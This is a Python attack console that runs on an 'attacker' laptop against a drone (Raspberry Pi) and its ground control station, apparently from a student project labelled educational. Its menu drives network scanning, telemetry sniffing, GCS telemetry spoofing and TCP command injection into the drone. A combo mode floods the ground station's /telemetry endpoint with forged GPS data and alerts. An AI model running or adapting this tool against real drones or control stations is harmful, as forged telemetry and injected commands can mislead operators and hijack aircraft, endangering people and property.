#!/usr/bin/env python3
"""
================================================================
  Full Attack Console — Combined Attack Interface
  Runs on LAPTOP B (Attacker)
================================================================
  One-stop menu to orchestrate all 4 attack phases:
    Phase 1 — Network Discovery (scanner.py)
    Phase 2 — Passive Sniffing  (sniffer.py)
    Phase 3A — Telemetry Spoof  (telemetry_spoofer.py)
    Phase 3B — Command Inject   (cmd_injector.py)

  USAGE:
    python full_attack.py
    python full_attack.py --rpi 10.193.181.136 --gcs 10.193.181.50
================================================================
"""

import argparse
import json
import os
import sys
import time
import threading

try:
    from colorama import init, Fore, Style
    init()
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = RESET = ""
    class Style:
        BRIGHT = RESET_ALL = ""

# Import our attack modules (same directory)
sys.path.insert(0, os.path.dirname(__file__))

from scanner import run_scan, get_local_ip, guess_subnet
from sniffer import TelemetrySniffer
from telemetry_spoofer import ATTACKS, run_attack
from cmd_injector import CommandInjector


# ==================== STATE ====================
state = {
    "rpi_ip": None,
    "gcs_ip": None,
    "rpi_port": 5760,
    "gcs_port": 5000,
}


def print_banner():
    print(f"""
{Fore.RED}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║      ██████╗ ██████╗  ██████╗ ███╗   ██╗███████╗           ║
║      ██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██╔════╝           ║
║      ██║  ██║██████╔╝██║   ██║██╔██╗ ██║█████╗             ║
║      ██║  ██║██╔══██╗██║   ██║██║╚██╗██║██╔══╝             ║
║      ██████╔╝██║  ██║╚██████╔╝██║ ╚████║███████╗           ║
║      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝          ║
║                                                              ║
║         Enemy Drone Detection & Attack Console              ║
║         For IDP Project — Educational Use Only              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")


def print_status():
    rpi = state["rpi_ip"] or f"{Fore.RED}NOT SET{Style.RESET_ALL}"
    gcs = state["gcs_ip"] or f"{Fore.RED}NOT SET{Style.RESET_ALL}"
    rpi_col = Fore.GREEN if state["rpi_ip"] else Fore.RED
    gcs_col = Fore.GREEN if state["gcs_ip"] else Fore.RED
    print(f"\n  {Fore.CYAN}Current Targets:{Style.RESET_ALL}")
    print(f"    Drone (RPI):  {rpi_col}{state['rpi_ip'] or 'NOT SET'}{Style.RESET_ALL}:{state['rpi_port']}")
    print(f"    GCS (Laptop A): {gcs_col}{state['gcs_ip'] or 'NOT SET'}{Style.RESET_ALL}:{state['gcs_port']}\n")


def print_main_menu():
    print(f"  {Fore.RED}{Style.BRIGHT}══ MAIN MENU ══{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}[1]{Style.RESET_ALL} Phase 1  — Network Scan (discover drone & GCS)")
    print(f"  {Fore.CYAN}[2]{Style.RESET_ALL} Phase 2  — Passive Telemetry Sniff")
    print(f"  {Fore.CYAN}[3]{Style.RESET_ALL} Phase 3A — Telemetry Spoof (fake GCS data)")
    print(f"  {Fore.CYAN}[4]{Style.RESET_ALL} Phase 3B — Command Injection (TCP)")
    print(f"  {Fore.CYAN}[5]{Style.RESET_ALL} Combo    — Sniff + Spoof simultaneously")
    print(f"  {Fore.CYAN}[6]{Style.RESET_ALL} Set IPs manually")
    print(f"  {Fore.CYAN}[Q]{Style.RESET_ALL} Quit")
    print()


def phase1_scan():
    """Run network scan and auto-populate IPs."""
    print(f"\n  {Fore.RED}─── PHASE 1: NETWORK SCAN ───{Style.RESET_ALL}")
    local = get_local_ip()
    subnet = guess_subnet(local)
    custom = input(f"  Subnet to scan [{subnet}]: ").strip()
    if custom:
        subnet = custom

    results = run_scan(subnet, verbose=True)

    if results["drone_ips"]:
        state["rpi_ip"] = results["drone_ips"][0]
        print(f"\n  {Fore.GREEN}✓ Auto-set Drone IP: {state['rpi_ip']}{Style.RESET_ALL}")
    if results["gcs_ips"]:
        state["gcs_ip"] = results["gcs_ips"][0]
        print(f"  {Fore.GREEN}✓ Auto-set GCS IP:   {state['gcs_ip']}{Style.RESET_ALL}")


def phase2_sniff():
    """Start passive telemetry sniffing."""
    print(f"\n  {Fore.RED}─── PHASE 2: PASSIVE SNIFF ───{Style.RESET_ALL}")
    if not state["rpi_ip"]:
        state["rpi_ip"] = input("  RPI IP: ").strip()
    sniffer = TelemetrySniffer()
    sniffer.sniff_tcp(state["rpi_ip"], state["rpi_port"])


def phase3a_spoof():
    """Telemetry spoofing attack."""
    print(f"\n  {Fore.RED}─── PHASE 3A: TELEMETRY SPOOF ───{Style.RESET_ALL}")
    if not state["gcs_ip"]:
        state["gcs_ip"] = input("  GCS (Laptop A) IP: ").strip()

    print(f"\n  {Fore.CYAN}Available Attacks:{Style.RESET_ALL}")
    for k, v in ATTACKS.items():
        print(f"    [{k}] — {v['desc']}")

    attack = input(f"\n  Choose attack [{Fore.YELLOW}gps{Style.RESET_ALL}]: ").strip() or "gps"
    if attack not in ATTACKS:
        print(f"  {Fore.RED}Invalid attack.{Style.RESET_ALL}")
        return

    interval = input("  Packet interval seconds [1.0]: ").strip()
    interval = float(interval) if interval else 1.0

    count_str = input("  Packet count [0=infinite]: ").strip()
    count = int(count_str) if count_str else 0

    run_attack(state["gcs_ip"], state["gcs_port"], attack, interval, count)


def phase3b_inject():
    """Command injection via TCP."""
    print(f"\n  {Fore.RED}─── PHASE 3B: COMMAND INJECTION ───{Style.RESET_ALL}")
    if not state["rpi_ip"]:
        state["rpi_ip"] = input("  RPI IP: ").strip()

    injector = CommandInjector(state["rpi_ip"], state["rpi_port"])
    if injector.connect():
        try:
            injector._print_commands()
            injector.interactive_mode()
        finally:
            injector.disconnect()


def phase_combo():
    """Run sniffer + spoofer simultaneously in separate threads."""
    print(f"\n  {Fore.RED}─── COMBO: SNIFF + SPOOF ───{Style.RESET_ALL}")
    if not state["rpi_ip"]:
        state["rpi_ip"] = input("  RPI IP: ").strip()
    if not state["gcs_ip"]:
        state["gcs_ip"] = input("  GCS IP: ").strip()

    attack = input(f"  Spoof attack type [gps]: ").strip() or "gps"
    print(f"\n  {Fore.YELLOW}Starting both sniffer and spoofer in parallel...{Style.RESET_ALL}")
    print(f"  Press Ctrl+C to stop both.\n")

    sniffer = TelemetrySniffer()
    stop_event = threading.Event()

    def spoof_thread():
        import time as _time
        step = 0
        while not stop_event.is_set():
            try:
                t, alerts = ATTACKS[attack]["func"](step)
                import requests as _req
                _req.post(
                    f"http://{state['gcs_ip']}:{state['gcs_port']}/telemetry",
                    json={"telemetry": t, "alerts": alerts},
                    timeout=2
                )
                step += 1
            except Exception:
                pass
            _time.sleep(1.0)

    spoof_t = threading.Thread(target=spoof_thread, daemon=True)
    spoof_t.start()
    print(f"  {Fore.GREEN}Spoofer started (background){Style.RESET_ALL}")

    try:
        sniffer.sniff_tcp(state["rpi_ip"], state["rpi_port"])
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        print(f"  {Fore.YELLOW}Spoofer stopped.{Style.RESET_ALL}")


def set_ips():
    """Manually configure target IPs."""
    print(f"\n  {Fore.CYAN}Set Target IPs:{Style.RESET_ALL}")
    rpi = input(f"  RPI (Drone) IP [{state['rpi_ip'] or 'none'}]: ").strip()
    if rpi:
        state["rpi_ip"] = rpi
    gcs = input(f"  GCS (Laptop A) IP [{state['gcs_ip'] or 'none'}]: ").strip()
    if gcs:
        state["gcs_ip"] = gcs
    print(f"  {Fore.GREEN}IPs updated.{Style.RESET_ALL}")


def main():
    print_banner()

    parser = argparse.ArgumentParser(description="Full Attack Console")
    parser.add_argument("--rpi", default=None, help="RPI IP (pre-set)")
    parser.add_argument("--gcs", default=None, help="GCS IP (pre-set)")
    parser.add_argument("--rpi-port", type=int, default=5760)
    parser.add_argument("--gcs-port", type=int, default=5000)
    args = parser.parse_args()

    if args.rpi:
        state["rpi_ip"] = args.rpi
    if args.gcs:
        state["gcs_ip"] = args.gcs
    state["rpi_port"] = args.rpi_port
    state["gcs_port"] = args.gcs_port

    # Try loading from previous scan
    if not state["rpi_ip"] and not state["gcs_ip"]:
        try:
            with open("scan_results.json") as f:
                r = json.load(f)
                if r.get("drone_ips"):
                    state["rpi_ip"] = r["drone_ips"][0]
                if r.get("gcs_ips"):
                    state["gcs_ip"] = r["gcs_ips"][0]
            print(f"  {Fore.GREEN}Loaded IPs from previous scan.{Style.RESET_ALL}")
        except FileNotFoundError:
            pass

    while True:
        print_status()
        print_main_menu()

        choice = input(f"  {Fore.RED}>{Style.RESET_ALL} ").strip().lower()

        if choice == "1":
            phase1_scan()
        elif choice == "2":
            phase2_sniff()
        elif choice == "3":
            phase3a_spoof()
        elif choice == "4":
            phase3b_inject()
        elif choice == "5":
            phase_combo()
        elif choice == "6":
            set_ips()
        elif choice in ("q", "quit", "exit"):
            print(f"\n  {Fore.YELLOW}Goodbye.{Style.RESET_ALL}\n")
            break
        else:
            print(f"  {Fore.RED}Invalid choice.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
